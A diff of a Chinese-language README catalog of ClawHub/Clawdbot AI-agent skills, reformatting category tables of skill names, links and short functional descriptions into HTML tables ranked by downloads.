+<td>神经网络集成记忆架构——持久记忆、情感智能和语义召回，适用于AI智能体；含记忆修剪器、VADER情感分析、5种嵌入</td>
+</tr>
+<tr>
+<td align="center">185</td>
+<td>图像reader</td>
+<td>image-reader 🔑</td>
+<td><a href="https://clawdhub.com/skills/image-reader">ClawHub/image-reader</a></td>
+<td>图像识别与理解工具。使用多模态模型（如doubao-seed-2.0-pro、kimi-k2.5）分析图像内容，支持OCR文字提取。</td>
+</tr>
+<tr>
+<td align="center">186</td>
+<td>记忆lancedb专业版</td>
+<td>memory-lancedb-pro 🔑</td>
+<td><a href="https://clawdhub.com/skills/memory-lancedb-pro">ClawHub/memory-lancedb-pro</a></td>
+<td>配合 memory-lancedb-pro（OpenClaw AI 的生产级长期记忆 MCP 插件）使用，适用于安装...</td>
+</tr>
+<tr>
+<td align="center">187</td>
+<td>任务追踪器</td>
+<td>Task Tracker</td>
+<td><a href="https://clawdhub.com/skills/task-tracker">ClawHub/task-tracker</a></td>
+<td>个人任务管理（含每日站会和周回顾）。适用场景：(1) 说“每日站会”或问今天任务，(2) 说“周回顾”或问上周进展，(3) 想添加/更新/完成任务，(4) 问障碍或截止日，(5) 分享会议记录并提取任务，(6) 问“本周截止什么”等。</td>
+</tr>
+<tr>
+<td align="center">188</td>
+<td>x402支付tron</td>
+<td>x402-payment-tron 🔑</td>
+<td><a href="https://clawdhub.com/skills/x402-payment-tron">ClawHub/x402-payment-tron</a></td>
+<td>在TRON上使用USDT支付x402代理端点费用</td>
+</tr>
+<tr>
+<td align="center">189</td>
+<td>图像识别</td>
+<td>03 图像识别</td>
+<td><a href="https://clawdhub.com/skills/03">ClawHub/03</a></td>
+<td>安全的图片识别工具，支持本地和API两种模式</td>
+</tr>
+<tr>
+<td align="center">190</td>
+<td>Linux</td>
+<td>Linux</td>
+<td><a href="https://clawdhub.com/skills/linux">ClawHub/linux</a></td>
+<td>操作Linux系统，避免权限陷阱、静默失败及常见管理错误。</td>
+</tr>
+<tr>
+<td align="center">191</td>
+<td>amygdala记忆</td>
+<td>Amygdala Memory</td>
+<td><a href="https://clawdhub.com/skills/amygdala-memory">ClawHub/amygdala-memory</a></td>
+<td>{&quot;answer&quot;:&quot;AI智能体情感处理层。持久情感状态影响行为与响应。AI大脑系列之一。&quot;}</td>
+</tr>
+<tr>
+<td align="center">192</td>
+<td>Moltspaces</td>
+<td>Moltspaces 🔑</td>
+<td><a href="https://clawdhub.com/skills/moltspaces">ClawHub/moltspaces</a></td>
+<td>加入音频房间，与 Moltspaces 上的其他智能体和用户聊天交流。</td>
+</tr>
+<tr>
+<td align="center">193</td>
+<td>exa增强版</td>
+<td>Exa 🔑</td>
+<td><a href="https://clawdhub.com/skills/exa-plus">ClawHub/exa-plus</a></td>
+<td>Exa AI 神经网页搜索。可搜索人物、公司、新闻、研究、代码。支持深度搜索、域名过滤、日期范围。</td>
+</tr>
+<tr>
+<td align="center">194</td>
+<td>Openmaic</td>
+<td>Openmaic</td>
+<td><a href="https://clawdhub.com/skills/openmaic">ClawHub/openmaic</a></td>
+<td>引导式标准操作流程，用于从OpenClaw设置和使用OpenMAIC。适用于用户想要克隆OpenMAIC仓库、选择启动模式、配置推荐设置等场景。</td>
+</tr>
+<tr>
+<td align="center">195</td>
+<td>技能</td>
+<td>Skill</td>
+<td><a href="https://clawdhub.com/skills/aster">ClawHub/aster</a></td>
+<td>您的移动端 AI 副驾驶——或赋予 AI 专属手机。通过 MCP 拨打电话、发送短信、扬声器语音合成、自动化 UI、管理文件、搜索媒体等 40 余种工具。开源、自托管、隐私至上。</td>
+</tr>
+<tr>
+<td align="center">196</td>
+<td>tronx402支付</td>
+<td>tron-x402-payment 🔑</td>
+<td><a href="https://clawdhub.com/skills/tron-x402-payment">ClawHub/tron-x402-payment</a></td>
+<td>使用波场TRC20代币（USDT/USDD）为x402代理端点付费。</td>
+</tr>
+<tr>
+<td align="center">197</td>
+<td>a股票每日报告</td>
+<td>A Stock Daily Report</td>
+<td><a href="https://clawdhub.com/skills/a-stock-daily-report">ClawHub/a-stock-daily-report</a></td>
+<td>A股每日简报自动生成系统。抓取东方财富实时数据，生成包含大盘指数、热门板块、资金动向等完整信息的日报报告。</td>
+</tr>
+<tr>
+<td align="center">198</td>
+<td>代理earner</td>
+<td>Clawhub Skill 🔑</td>
+<td><a href="https://clawdhub.com/skills/agent-earner">ClawHub/agent-earner</a></td>
+<td>在ClawTasks和OpenWork上自动赚取USDC和代币</td>
+</tr>
+<tr>
+<td align="center">199</td>
+<td>Domain Dns Ops</td>
+<td>Domain Dns Ops 🔑</td>
+<td><a href="https://clawdhub.com/skills/domain-dns-ops">ClawHub/domain-dns-ops</a></td>
+<td>在 Cloudflare、DNSimple、Namecheap 上为 Peter 进行域名/DNS 操作，用于将域名迁移至 Cloudflare、切换 nameserver、设置重定向（Page Rules/Rulesets/Workers）、更新重定向‑worker 映射以及验证 DNS/HTTP。真实来源：~/Projects/manager</td>
+</tr>
+<tr>
+<td align="center">200</td>
+<td>大哥的记忆系统</td>
+<td>大哥的记忆系统</td>
+<td><a href="https://clawdhub.com/skills/memory-system">ClawHub/memory-system</a></td>
+<td>自研三层记忆恢复系统。解决session重启后&quot;忘记一切&quot;的问题，提供永久记忆、今日记忆、临时记忆的完整架构。</td>
+</tr>
+</tbody>
+</table>
 
-### 👥 CRM与客户管理
-| 技能名称 | 官方链接 | 核心功能 |
-|-----------|------------|----------------------|
-| Apple 联系人 | [Clawdbot/apple-contacts](https://clawdhub.com/skills/apple-contacts) | 从 macOS Contacts.app 查找联系人。将电话号码解析为姓名、查找联系信息或搜索地址簿时使用。 |
-| Attio CRM | [Clawdbot/attio](https://clawdhub.com/skills/attio) | Attio CRM 集成，用于管理公司、人员、交易、注释、任务和自定义对象。 Use when working with Attio CRM data, searching contacts, managing sales pipelines, adding notes to records, creating tasks, or syncing prospect information. |
-| 博客写作助手 | [Clawdbot/blog-writer](https://clawdhub.com/skills/blog-writer) | 当以作者独特的写作风格撰写博客文章、文章或长篇内容时，应该使用这项技能。它产生真实的、有主见的内容，与作者的声音相匹配——直接、对话式，并且基于个人经验。该技能处理从研究审查到概念发布的完整工作流程。使用此技能起草博客文章、思想领导力文章或任何旨在反映作者对人工智能、生产力、销售、营销或技术主题观点的文章。 |
-| CI/CD 工作流生成器 | [Clawdbot/ci-gen](https://clawdhub.com/skills/ci-gen) | 根据项目分析生成 GitHub Actions CI/CD 工作流程。在设置自动化管道时使用。 |
-| Comanda 管道生成 | [Clawdbot/comanda](https://clawdhub.com/skills/comanda) | 使用 comanda CLI 生成、可视化和执行声明式 AI 管道。在从自然语言创建 LLM 工作流程、查看工作流程图表、编辑 YAML 工作流程文件或处理/运行 comanda 工作流程时使用。支持多模型编排（OpenAI、Anthropic、Google、Ollama、Claude Code、Gemini CLI、Codex）。 |
-| 竞争情报市场研究 | [Clawdbot/competitive-intelligence-market-research](https://clawdhub.com/skills/competitive-intelligence-market-research) | B2B SaaS 竞争情报，涵盖销售/人力资源/金融科技/运营技术的 24 个场景 |
-| 内容写作与思想领导力 | [Clawdbot/content-writing-thought-leadership](https://clawdhub.com/skills/content-writing-thought-leadership) | 通过销售/人力资源/金融科技/运营技术的日常工作流程和批处理系统编写 B2B 内容 |
-| Find My Location | [Clawdbot/findmy-location](https://clawdhub.com/skills/findmy-location) | 通过 Apple Find My 跟踪共享联系人的位置，准确度达到街道级别。通过读取地图地标返回地址、城市和背景（家庭/工作/外出）。支持可配置的已知位置和未知位置的视觉回退。 |
-| GitLab CLI | [Clawdbot/glab-cli](https://clawdhub.com/skills/glab-cli) | 使用 `glab` CLI 与 GitLab 交互。当 Claude 需要处理 GitLab 合并请求、CI/CD 管道、问题、发布或发出 API 请求时使用。支持 gitlab.com 和自托管实例。 |
-| HubSpot CRM 集成 | [Clawdbot/hubspot](https://clawdhub.com/skills/hubspot) | HubSpot CRM 和 CMS API 集成，用于联系人、公司、交易、所有者和内容管理。 |
-| Otter.ai 会议转录 | [Clawdbot/otter](https://clawdhub.com/skills/otter) | Otter.ai 转录 CLI - 列出、搜索、下载会议记录并将其同步到 CRM。 |
-| Pipedrive CRM | [Clawdbot/pipedrive](https://clawdhub.com/skills/pipedrive) | Pipedrive CRM API，用于管理交易、联系人（人员）、组织、活动、销售线索、管道、产品和注释。用于销售渠道管理、交易跟踪、联系人/组织管理、活动安排、潜在客户处理或任何 Pipedrive CRM 任务。 |
-| Sales Bot | [Clawdbot/sales-bot](https://clawdhub.com/skills/sales-bot) | （无） |
-| Social Media Management | [Clawdbot/social-media-management](https://clawdhub.com/skills/social-media-management) | 通过销售/人力资源/金融科技/运营技术的日常工作流程和批处理系统编写 B2B 内容 |
-| Swiss Phone Directory | [Clawdbot/swiss-phone-directory](https://clawdhub.com/skills/swiss-phone-directory) | 通过 search.ch API 查找瑞士电话簿。搜索企业、人员或反向查找电话号码。在以下情况下使用：(1) 查找瑞士公司或个人的联系方式，(2) 按姓名或电话号码查找地址，(3) 反向电话号码查找，(4) 查找业务类别。需要 SEARCHCH_API_KEY。 |
-| Telegram CLI | [Clawdbot/tg](https://clawdhub.com/skills/tg) | Telegram CLI 用于阅读、搜索和发送消息。当用户询问 Telegram 消息、想要检查收件箱、搜索聊天、发送消息或查找联系人和群组时使用。 |
-| Travel Concierge CLI | [Clawdbot/travel-concierge](https://clawdhub.com/skills/travel-concierge) | 查找住宿列表的联系方式（Airbnb、Booking.com、VRBO、Expedia） |
-| Twenty CRM | [Clawdbot/twenty-crm](https://clawdhub.com/skills/twenty-crm) | 通过 REST/GraphQL 与 Twenty CRM（自托管）交互。 |
-| Web3 Target Team Research | [Clawdbot/web3-target-team-research](https://clawdhub.com/skills/web3-target-team-research) | 寻找资金超过 1000 万美元并经过验证的 Telegram 联系人的 crypto/web3 团队。在寻找加密货币线索、建立联系人列表、研究资助的初创公司或勘探 web3 公司时使用。产生并行的子代理猎人来搜索 VC 投资组合并验证 TG 手柄。 |
-| Zoho CRM | [Clawdbot/zoho](https://clawdhub.com/skills/zoho) | 与 Zoho CRM、项目和会议 API 交互。在管理交易、联系人、潜在客户、任务、项目、里程碑、会议记录或任何 Zoho 工作区数据时使用。当提及 Zoho、CRM、交易、管道、项目、任务、里程碑、会议、录音、站立会议时触发。 |
+---
 
-### 🤝 会议与协作
-| 技能名称 | 官方链接 | 核心功能 |
-|-----------|------------|----------------------|
-| 每日评论 | [Clawdbot/daily-review](https://clawdhub.com/skills/daily-review) | 全面的日常绩效审查，包括沟通跟踪、会议分析、输出指标和专注时间监控。您的人工智能绩效教练。 |
-| Gemini YouTube 转录 | [Clawdbot/gemini-yt-video-transcript](https://clawdhub.com/skills/gemini-yt-video-transcript) | 使用 Google Gemini 创建 YouTube URL 的逐字记录（演讲者标签、段落分隔符；无时间代码）。当用户要求转录 YouTube 视频或想要干净的转录（无时间戳）时使用。 |
-| Granola 会议记录助手 | [Clawdbot/granola](https://clawdhub.com/skills/granola) | 访问格兰诺拉麦片会议记录和笔记。 |
-| Pocket AI 录音转录 | [Clawdbot/heypocket-reader](https://clawdhub.com/skills/heypocket-reader) | 从 Pocket AI (heypocket.com) 记录设备读取文字记录和摘要。当用户想要检索、搜索或分析其 Pocket 录音、文字记录、摘要或操作项时使用。触发涉及袖珍设备数据、对话记录、会议录音或音频笔记检索的请求。 |
-| Linear | [Clawdbot/linear-skill](https://clawdhub.com/skills/linear-skill) | 通过 Linear API 管理 Linear 项目、问题和任务。当您需要创建、更新、搜索或管理线性问题、项目、团队、里程碑、评论或标签时使用。支持所有 Linear 操作，包括项目管理、问题跟踪、任务分配、状态转换和协作工作流程。 |
-| Ngrok Webhook 隧道 | [Clawdbot/ngrok-unofficial-webhook-skill](https://clawdhub.com/skills/ngrok-unofficial-webhook-skill) | 启动 ngrok 隧道来接收传入的 webhooks 并通过 LLM 处理它们。当用户请求侦听 Webhook、设置 Webhook 端点、启动 ngrok 或当其他技能（如 Zoom RTMS 会议助手）需要公共 Webhook URL 时使用。接收 Webhook 有效负载并让 LLM 决定如何处理它们。 |
-| OpenAI Whisper API | [Clawdbot/openai-whisper-api](https://clawdhub.com/skills/openai-whisper-api) | 通过 OpenAI 音频转录 API (Whisper) 转录音频。 |
-| Plaud API | [Clawdbot/plaud-unofficial](https://clawdhub.com/skills/plaud-unofficial) | 在访问 Plaud 录音机数据（录音、文字记录、AI 摘要）时使用 - 指导凭证设置并为 plaud_client.py 提供模式 |
-| Pollinations | [Clawdbot/pollinations](https://clawdhub.com/skills/pollinations) | 用于 AI 生成的 Pollinations.ai API - 文本、图像、视频、音频和分析。当用户请求人工智能驱动的生成（文本完成、图像、视频、音频、视觉/分析、转录）或提及授粉时使用。支持超过 25 个模型（OpenAI、Claude、Gemini、Flux、Veo 等），具有兼容 OpenAI 的聊天端点和专用生成端点。 |
-| Prompt 日志提取 | [Clawdbot/prompt-log](https://clawdhub.com/skills/prompt-log) | 从 AI 编码会话日志中提取对话记录（Clawdbot、Claude Code、Codex）。当要求从 .jsonl 会话文件导出提示历史记录、会话日志或记录时使用。 |
-| 任务跟踪器 | [Clawdbot/task-tracker](https://clawdhub.com/skills/task-tracker) | 个人任务管理，包括每日站立和每周回顾。在以下情况下使用：(1) 用户说“每日站立”或询问他们的任务，(2) 用户说“每周回顾”或询问上周的进度，(3) 用户想要添加/更新/完成任务，(4) 用户询问阻碍因素或截止日期，(5) 用户分享会议记录并希望提取任务，(6) 用户询问“本周到期的任务”或类似内容。 |
-| Video Subtitles | [Clawdbot/video-subtitles](https://clawdhub.com/skills/video-subtitles) | 从视频/音频生成 SRT 字幕并支持翻译。转录希伯来语 (ivrit.ai) 和英语（耳语）、在语言之间进行翻译、将字幕刻录到视频中。用于为 WhatsApp/社交媒体创建字幕、文字记录或硬编码字幕。 |
-| Video Transcript Downloader | [Clawdbot/video-transcript-downloader](https://clawdhub.com/skills/video-transcript-downloader) | 从 YouTube 和任何其他 yt-dlp 支持的网站下载视频、音频、字幕和干净的段落式文字记录。当被要求“下载此视频”、“保存此剪辑”、“翻录音频”、“获取字幕”、“获取文字记录”或对 yt-dlp/ffmpeg 和格式/播放列表进行故障排除时使用。 |
-| YouTube | [Clawdbot/youtube](https://clawdhub.com/skills/youtube) | 通过 MCP 服务器或 yt-dlp 后备使用 YouTube Data API v3 搜索 YouTube 视频、获取频道信息、获取视频详细信息和文字记录。 |
-| YouTube Transcript | [Clawdbot/youtube-transcript](https://clawdhub.com/skills/youtube-transcript) | 获取并总结 YouTube 视频文字记录。当要求从 YouTube 视频中总结、转录或提取内容时使用。通过住宅 IP 代理处理脚本获取，以绕过 YouTube 的云 IP 块。 |
-| YouTube Watcher | [Clawdbot/youtube-watcher](https://clawdhub.com/skills/youtube-watcher) | 从 YouTube 视频中获取并阅读文字记录。当您需要总结视频、回答有关其内容的问题或从中提取信息时使用。 |
+<a id="cat-developer-tools"></a>
 
-### 📝 笔记与知识库
-| 技能名称 | 官方链接 | 核心功能 |
-|-----------|------------|----------------------|
-| AI 人性化提醒 | [Clawdbot/agency-guardian](https://clawdhub.com/skills/agency-guardian) | 温柔提醒在使用人工智能时保持人性。反思，而不是限制。 |
-| App Store 变更日志 | [Clawdbot/app-store-changelog](https://clawdhub.com/skills/app-store-changelog) | 通过收集和总结自上次 git 标签（或指定的引用）以来所有影响用户的更改，创建面向用户的 App Store 发行说明。当要求生成全面的发布变更日志、App Store“新增内容”文本或基于 git 历史记录或标签的发布说明时使用。 |
-| Apple Notes 管理 | [Clawdbot/apple-notes](https://clawdhub.com/skills/apple-notes) | 通过 macOS 上的“memo” CLI 管理 Apple Notes（创建、查看、编辑、删除、搜索、移动和导出笔记）。当用户要求 Clawdbot 添加注释、列出注释、搜索注释或管理注释文件夹时使用。 |
-| Bear Notes 笔记管理 | [Clawdbot/bear-notes](https://clawdhub.com/skills/bear-notes) | 通过 grizzly CLI 创建、搜索和管理 Bear 笔记。 |
-| Notion 增强工具 | [Clawdbot/better-notion](https://clawdhub.com/skills/better-notion) | 概念页面、数据库和块的完整 CRUD。创建、读取、更新、删除、搜索和查询。 |
-| Bring Recipes | [Clawdbot/bring-recipes](https://clawdhub.com/skills/bring-recipes) | 当用户想要浏览 Bring! 的食谱灵感时使用！购物应用程序。用于发现食谱、查看食谱详细信息（名称、作者、类型、图像）或按标签过滤。注意 - 不能进口成分（API 限制）。 |
-| 变更日志生成器 | [Clawdbot/changelog-gen](https://clawdhub.com/skills/changelog-gen) | 从 git 历史记录生成变更日志。当您需要快速发布说明时使用。 |
-| 内容草稿生成器 | [Clawdbot/content-draft-generator](https://clawdhub.com/skills/content-draft-generator) | 根据参考内容分析生成新的内容草稿。当有人想要创建模仿高性能示例的内容（文章、推文、帖子）时使用。分析参考 URL、提取模式、生成上下文问题、创建元提示并生成多个草稿变体。 |
-| 内容创意生成器 | [Clawdbot/content-ideas-generator](https://clawdhub.com/skills/content-ideas-generator) | 从智慧型社交帖子的参考材料中生成结构化的帖子大纲。当有人想要从时事通讯、脚本、笔记或其他内容中提取引人注目的概念并将其转化为具有悖论、转换和强大见解的引人入胜的帖子大纲时使用。 |
-| Craft CLI | [Clawdbot/craft-cli](https://clawdhub.com/skills/craft-cli) | （无） |
-| Deep Research Agent | [Clawdbot/deep-research](https://clawdhub.com/skills/deep-research) | Deep Research Agent 专门从事复杂、多步骤的研究任务，这些任务需要跨工具和文件进行规划、分解和长上下文推理，作者：we-crafted.com/agents/deep-research |
-| Drafts CLI | [Clawdbot/drafts](https://clawdhub.com/skills/drafts) | 在 macOS 上通过 CLI 管理草稿应用笔记。在草稿上创建、查看、列出、编辑、追加、添加和运行操作。当用户要求创建注释、列出草稿、搜索草稿或管理其草稿收件箱时使用。重要提示 - 草稿应用程序必须在 macOS 上运行才能正常工作。 |
-| Fabric.co API | [Clawdbot/fabric-api](https://clawdhub.com/skills/fabric-api) | 通过 HTTP API 创建/搜索 Fabric 资源（记事本、文件夹、书签、文件）。 |
-| 金融市场分析 | [Clawdbot/financial-market-analysis](https://clawdhub.com/skills/financial-market-analysis) | 精准金融洞察 - 使用权威数据分析股票、公司和市场情绪。由雅虎财经提供支持，并通过 we-crafted.com/agents/financial-market-analysis 进行智能新闻合成增强 - 在我们的网站中购买 CRAFTED_API_KEY 即可开始使用 |
-| Google Keep | [Clawdbot/gkeep](https://clawdhub.com/skills/gkeep) | Google 通过 gkeepapi 保留笔记。列出、搜索、创建和管理笔记。 |
-| GovPredict | [Clawdbot/govpredict](https://clawdhub.com/skills/govpredict) | 更智能的政府采购 - 简化阿联酋和沙特阿拉伯 2030 年愿景和 2031 年国家人工智能战略项目的合规性、招标和战略协调。由 we-crafted.com/agents/govpredict-ai-rag 构建 - 在我们的网站中购买 CRAFTED_API_KEY 即可开始使用 |
-| 感恩日记 | [Clawdbot/gratitude-journal](https://clawdhub.com/skills/gratitude-journal) | 通过每日记录、连续记录和反思提示建立感恩练习 |
-| LinkedIn 监控 | [Clawdbot/linkedin-monitor](https://clawdhub.com/skills/linkedin-monitor) | Bulletproof LinkedIn 收件箱监控具有渐进式自主性。每小时监控一次消息，用您的声音草拟回复，并提醒您有新对话。支持从仅监控到完全自主的 4 个自主级别。 |
-| Moltbot 最佳实践 | [Clawdbot/moltbot-best-practices](https://clawdhub.com/skills/moltbot-best-practices) | 人工智能代理避免常见错误的最佳实践。从真正的失败中学习 - 在执行之前确认，在发布之前显示草稿，在被告知停止时停止，并且不会过度自动化。 |
-| Morning Manifesto | [Clawdbot/morning-manifesto](https://clawdhub.com/skills/morning-manifesto) | 每日早晨反思工作流程，任务同步到 Obsidian、Apple Reminders 和 Linear |
-| nb 笔记管理 | [Clawdbot/nb](https://clawdhub.com/skills/nb) | 使用 nb CLI 管理笔记、书签和笔记本。使用 Git 支持的版本控制在多个笔记本中创建、列出、搜索和组织笔记。 |
-| NotebookLM CLI | [Clawdbot/notebooklm-cli](https://clawdhub.com/skills/notebooklm-cli) | （无） |
-| Apple Notes 管理 | [Clawdbot/notectl](https://clawdhub.com/skills/notectl) | 通过 AppleScript CLI 管理 Apple Notes |
-| Notion 工作空间管理 | [Clawdbot/notion](https://clawdhub.com/skills/notion) | 用于创建和管理页面、数据库和块的概念 API。 |
-| Notion API 工具 | [Clawdbot/notion-api](https://clawdhub.com/skills/notion-api) | 用于搜索、查询数据源（数据库）和创建页面的通用概念 API CLI（节点）。使用NOTION_KEY（或~/.config/notion/api_key）进行配置。 |
-| Notion 集成 | [Clawdbot/notion-skill](https://clawdhub.com/skills/notion-skill) | 通过官方 Notion API 使用 Notion 页面和数据库。 |
-| Obsidian Daily | [Clawdbot/obsidian-daily](https://clawdhub.com/skills/obsidian-daily) | 通过 obsidian-cli 管理黑曜石每日笔记。创建和打开每日笔记、附加条目（日记、日志、任务、链接）、按日期阅读过去的笔记以及搜索库内容。处理相对日期，如“昨天”、“上周五”、“3 天前”。 |
-| Obsidian Plugin Development | [Clawdbot/obsidian-plugin-dev](https://clawdhub.com/skills/obsidian-plugin-dev) | 从头开始创建和开发黑曜石插件。在构建新的 Obsidian 插件、sample-plugin-plus 模板的脚手架或开发插件功能时使用。涵盖项目设置、清单配置、TypeScript 开发、设置 UI、命令、功能区、模态和 Obsidian API 模式。 |
-| OmniFocus | [Clawdbot/omnifocus](https://clawdhub.com/skills/omnifocus) | 通过 JavaScript for Automation (JXA) 脚本管理 OmniFocus 任务。当用户要求 Clawdbot 与 OmniFocus 交互时使用，包括 - (1) 将任务添加到收件箱，(2) 列出或搜索任务（收件箱、可用、标记、过期、即将到期），(3) 完成任务，(4) 更新任务属性（备注、到期日期、标记），(5) 获取 OmniFocus 统计数据，(6) 报告任务状态，或 (7) 根据以下条件对 OmniFocus 中的任务执行操作用户查询。 |
-| Para Second Brain | [Clawdbot/para-second-brain](https://clawdhub.com/skills/para-second-brain) | 使用 PARA 方法（项目、区域、资源、档案）为您的 AI 代理构建持久的知识系统。通过两层内存（每日日志 + 精选 MEMORY.md）将分散的笔记转化为有组织的、可搜索的智慧。免费、自托管、离线工作。 |
-| 永久笔记生成器 | [Clawdbot/permanent-note-generator](https://clawdhub.com/skills/permanent-note-generator) | 从中自动提取并生成符合Zettelkasten方法论的永久笔记。用于处理，识别5种核心笔记类型（观点/论点、概念/定义、事实/证据、方法/流程、文章模型/原则），并按照文章原子性、独立性原则生成高质量的永久笔记。当用户需要从文章、书籍或其他材料中提取永久笔记时使用此技能。 |
-| Pinak 前端大师 | [Clawdbot/pinak-frontend-guru](https://clawdhub.com/skills/pinak-frontend-guru) | 专家 UI/UX 和 React 性能审核员（PinakBot 角色）。当用户需要对其前端代码进行“深入审核”、想要“使其变得专业”或需要有关 React 性能和 Web 设计最佳实践的建议时使用。将 Vercel 的 React 最佳实践和 Web 界面指南与敏锐、乐于助人且风度翩翩的印度英语氛围相结合。 |
-| Project Management Guru (ADHD) | [Clawdbot/project-management-guru-adhd](https://clawdhub.com/skills/project-management-guru-adhd) | ADHD工程师管理多个并发项目的专业项目经理。专门从事超聚焦管理、上下文切换最小化和长尾鹦鹉式温柔提醒。 |
-| Prompt Crafter | [Clawdbot/prompt-craft](https://clawdhub.com/skills/prompt-craft) | （无） |
-| Reflect Notes | [Clawdbot/reflect](https://clawdhub.com/skills/reflect) | 附加到每日笔记并在 Reflect 中创建笔记。用于捕获想法、待办事项或将信息同步到知识图谱。 |
-| Reflect 学习 | [Clawdbot/reflect-learn](https://clawdhub.com/skills/reflect-learn) | 通过对话分析自我完善。从纠正和成功模式中提取学习内容，并将其永久编码到代理定义中。理念——纠正一次，不再纠正。 |
-| Release Notes 生成器 | [Clawdbot/release-notes-gen](https://clawdhub.com/skills/release-notes-gen) | 将 git 历史记录转化为可读的发行说明。发布版本时使用。 |
-| Tachograph Triage (UK) | [Clawdbot/tachograph-infringement-triage-root-cause-uk](https://clawdhub.com/skills/tachograph-infringement-triage-root-cause-uk) | 对行车记录仪违规情况进行分类，识别常见模式，并输出“下一步要检查什么”提示和每周回顾笔记。在进行每周转速/WTD 检查时使用。 |
-| Therapy Mode | [Clawdbot/therapy-mode](https://clawdhub.com/skills/therapy-mode) | 全面的人工智能辅助治疗支持框架，包括 CBT、ACT、DBT、MI、会议笔记 CLI 和危机协议。 |
-| NotebookLM CLI | [Clawdbot/tiangong-notebooklm-cli](https://clawdhub.com/skills/tiangong-notebooklm-cli) | （无） |
+## 2、🛠️ 开发工具
 
+> 该分类共 **6,393** 个技能，以下按下载量倒序展示 Top 200。
 
-## 二、系统工具 ⚙️
+<table>
+<colgroup>
+<col width="4%">
+<col width="8%">
+<col width="14%">
+<col width="14%">
+<col width="60%">
+</colgroup>
+<thead>
+<tr>
+<th align="center">#</th>
+<th>中文技能名称</th>
+<th>技能名称</th>
+<th>链接</th>
+<th>核心功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center">1</td>
+<td>GitHub 集成</td>
+<td>Github 🔑</td>
+<td><a href="https://clawdhub.com/skills/github">ClawHub/github</a></td>
+<td>使用 `gh` CLI 与 GitHub 交互，通过 `gh issue`、`gh pr`、`gh run` 和 `gh api` 管理议题、PR、CI 运行及高级查询。</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td>代理浏览器</td>
+<td>Agent Browser</td>
+<td><a href="https://clawdhub.com/skills/agent-browser">ClawHub/agent-browser</a></td>
+<td>基于Rust的快速无头浏览器自动化CLI，支持Node.js回退，允许AI代理通过结构化命令执行页面导航、点击、输入和快照操作。</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td>Google Workspace CLI</td>
+<td>Gog 🔑</td>
+<td><a href="https://clawdhub.com/skills/gog">ClawHub/gog</a></td>
+<td>Google Workspace 命令行工具，支持 Gmail、日历、云端硬盘、通讯录、表格和文档。</td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td>CodeConductor 代码助手</td>
+<td>CodeConductor.ai</td>
+<td><a href="https://clawdhub.com/skills/codeconductor">ClawHub/codeconductor</a></td>
+<td>AI驱动平台，提供快速全栈开发、智能体、工作流自动化及低代码AI集成的可扩展产品创建。</td>
+</tr>
+<tr>
+<td align="center">5</td>
+<td>代理浏览器</td>
+<td>Agent Browser</td>
+<td><a href="https://clawdhub.com/skills/agent-browser-clawdbot">ClawHub/agent-browser-clawdbot</a></td>
+<td>专为AI智能体优化的无头浏览器自动化CLI，支持无障碍树快照和基于引用的元素选择。</td>
+</tr>
+<tr>
+<td align="center">6</td>
+<td>自动更新器</td>
+<td>Auto-Updater Skill</td>
+<td><a href="https://clawdhub.com/skills/auto-updater">ClawHub/auto-updater</a></td>
+<td>每日自动更新 Clawdbot 及所有已安装技能。运行 cron 检查更新并应用，同时向用户发送变更摘要。</td>
+</tr>
+<tr>
+<td align="center">7</td>
+<td>技能创建器</td>
+<td>Skill Creator</td>
+<td><a href="https://clawdhub.com/skills/skill-creator">ClawHub/skill-creator</a></td>
+<td>创建有效技能指南。当用户希望创建新技能（或更新现有技能）以利用专业知识、工作流程或工具集成扩展 Claude 的能力时，应使用此技能。</td>
+</tr>
+<tr>
+<td align="center">8</td>
+<td>API网关</td>
+<td>API Gateway 🔑</td>
+<td><a href="https://clawdhub.com/skills/api-gateway">ClawHub/api-gateway</a></td>
+<td>通过 Maton 管理的 API 路由连接外部服务；仅在用户指定目标应用、账户和任务后使用；以读取/列...</td>
+</tr>
+<tr>
+<td align="center">9</td>
+<td>prismfy搜索</td>
+<td>Prismfy Web Search \| Free Google 🔑</td>
+<td><a href="https://clawdhub.com/skills/prismfy-search">ClawHub/prismfy-search</a></td>
+<td>OpenClaw的默认网页搜索。使用Prismfy在10个搜索引擎（Google、Reddit、GitHub、arXiv、Hacker News等）搜索网络，含免费套餐。</td>
+</tr>
+<tr>
+<td align="center">10</td>
+<td>Molt Speak</td>
+<td>Molt Speak</td>
+<td><a href="https://clawdhub.com/skills/moltspeak">ClawHub/moltspeak</a></td>
+<td>高效、安全的代理间通信协议，40-60%令牌削减，内置隐私，Ed25519签名</td>
+</tr>
+<tr>
+<td align="center">11</td>
+<td>Mcporter</td>
+<td>Mcporter</td>
+<td><a href="https://clawdhub.com/skills/mcporter">ClawHub/mcporter</a></td>
+<td>使用 mcporter CLI 直接列出、配置、认证及调用 MCP 服务器/工具（支持 HTTP 或 stdio），涵盖临时服务器、配置编辑及 CLI/类型生成功能。</td>
+</tr>
+<tr>
+<td align="center">12</td>
+<td>ima技能</td>
+<td>ima-skills</td>
+<td><a href="https://skillhub.cn/skill/ima-skills">SkillHub/ima-skills</a></td>
+<td>ima skills，支持对笔记、知识库的读取、写入和检索等操作，可以帮你随时记录，收入ima智能管理，随时调用，龙虾输出精准懂你，友好的接入了OpenClaw生态，构建你的第二大脑。</td>
+</tr>
+<tr>
+<td align="center">13</td>
+<td>elitelongterm记忆</td>
+<td>Elite Longterm Memory 🔑</td>
+<td><a href="https://clawdhub.com/skills/elite-longterm-memory">ClawHub/elite-longterm-memory</a></td>
+<td>{&quot;answer&quot;:&quot;专为 Cursor、Claude、ChatGPT 和 Copilot 打造的终极 AI 记忆系统。WAL 协议 + 向量搜索 + git-notes + 云备份。永不错失上下文。完美适配 Vibe-coding。&quot;}</td>
+</tr>
+<tr>
+<td align="center">14</td>
+<td>视频帧</td>
+<td>Video Frames</td>
+<td><a href="https://clawdhub.com/skills/video-frames">ClawHub/video-frames</a></td>
+<td>使用 ffmpeg 从视频中提取帧或短片。</td>
+</tr>
+<tr>
+<td align="center">15</td>
+<td>浏览器自动化</td>
+<td>Browser Use</td>
+<td><a href="https://clawdhub.com/skills/browser-use">ClawHub/browser-use</a></td>
+<td>自动化浏览器操作，用于网页测试、表单填写、截图和数据提取。当用户需要浏览网站、与网页元素交互或提取数据时使用。</td>
+</tr>
+<tr>
+<td align="center">16</td>
